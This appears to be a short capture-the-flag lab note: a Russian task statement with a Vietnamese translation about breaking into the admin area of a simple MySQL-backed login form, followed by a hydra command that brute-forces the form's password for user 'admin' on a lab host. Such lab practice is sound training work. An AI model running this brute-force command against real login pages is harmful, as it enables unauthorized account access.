# Простая форма авторизации
Ответ где-то в кабинете администратора. Но ни логина, ни пароля вы не знаете? Известно только, что база данных MySQL.
---
Mẫu ủy quyền đơn giản

Câu trả lời nằm ở đâu đó trong văn phòng quản trị viên. Nhưng bạn không biết thông tin đăng nhập hoặc mật khẩu của mình? Chúng tôi chỉ biết rằng cơ sở dữ liệu là MySQL.


hydra -l admin -P passwords.txt http-post-form "https://4418ce5b-b9ff-4824-8693-21b566388d97-sqlinj-auth-simple-app.web.lms.itmo.xyz/login.php:username=^USER^&password=^PASS^:F=incorrect"
